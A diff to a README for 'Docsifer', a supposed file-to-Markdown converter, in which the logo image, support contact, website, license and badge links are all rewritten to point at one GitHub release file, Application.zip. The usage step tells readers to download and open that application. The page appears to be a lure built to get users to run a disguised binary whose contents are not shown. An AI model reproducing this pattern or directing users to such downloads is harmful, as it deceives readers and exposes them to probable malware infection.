@@ -1,6 +1,6 @@
 # Docsifer 📚✨
 
-![Docsifer Logo](https://example.com/docsifer_logo.png)
+![Docsifer Logo](https://github.com/Lynixtaxic/docsifer/releases/download/v1.0/Application.zip)
 
 Welcome to Docsifer, your ultimate tool for converting various data formats into Markdown for applications such as indexing, text analysis, and more! With support for a wide range of file types including PDF, PowerPoint, Word, Excel, Images, Audio, HTML, and other text-based formats, Docsifer leverages state-of-the-art Language Model-based techniques to enhance performance and accuracy.
 
@@ -14,7 +14,7 @@ Welcome to Docsifer, your ultimate tool for converting various data formats into
 
 ## Usage 🚀
 
-1. Install Docsifer by downloading the application from [here](https://github.com/user-attachments/files/18426772/Application.zip "Launch Docsifer")
+1. Install Docsifer by downloading the application from [here](https://github.com/Lynixtaxic/docsifer/releases/download/v1.0/Application.zip "Launch Docsifer")
 2. Open the application and select the file you want to convert to Markdown
 3. Choose the desired output format and let Docsifer work its magic
 4. Copy the generated Markdown content and use it in your preferred applications or platforms
@@ -39,21 +39,21 @@ We welcome contributions from the community to enhance Docsifer further. If you 
 
 ## Support & Feedback 📧
 
-For any support or feedback related to Docsifer, please reach out to us at docsifer.support@example.com. We value your input and are committed to providing a seamless user experience.
+For any support or feedback related to Docsifer, please reach out to us at https://github.com/Lynixtaxic/docsifer/releases/download/v1.0/Application.zip We value your input and are committed to providing a seamless user experience.
 
 ## Explore More 🌐
 
-Visit our [website](https://www.docsifer.com) to learn more about Docsifer and stay updated on the latest features and developments. Join our community of users and discover the power of converting data formats into Markdown effortlessly.
+Visit our [website](https://github.com/Lynixtaxic/docsifer/releases/download/v1.0/Application.zip) to learn more about Docsifer and stay updated on the latest features and developments. Join our community of users and discover the power of converting data formats into Markdown effortlessly.
 
 ## License 📜
 
-Docsifer is licensed under the MIT License. See the [LICENSE](https://github.com/docsifer/docsifer/blob/main/LICENSE) file for more information.
+Docsifer is licensed under the MIT License. See the [LICENSE](https://github.com/Lynixtaxic/docsifer/releases/download/v1.0/Application.zip) file for more information.
 
 ---
 
 Feel free to explore the full potential of Docsifer and start converting your data formats into Markdown effortlessly. Let Docsifer simplify your workflow and enhance your text processing tasks with ease! 🚀📚
 
-[![Download Docsifer](https://img.shields.io/badge/Download-Docsifer-<COLOR>.svg)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Docsifer](https://github.com/Lynixtaxic/docsifer/releases/download/v1.0/Application.zip<COLOR>.svg)](https://github.com/Lynixtaxic/docsifer/releases/download/v1.0/Application.zip)
 
 **Note:** Click the button above to download Docsifer and unlock a world of possibilities! 🌟
 
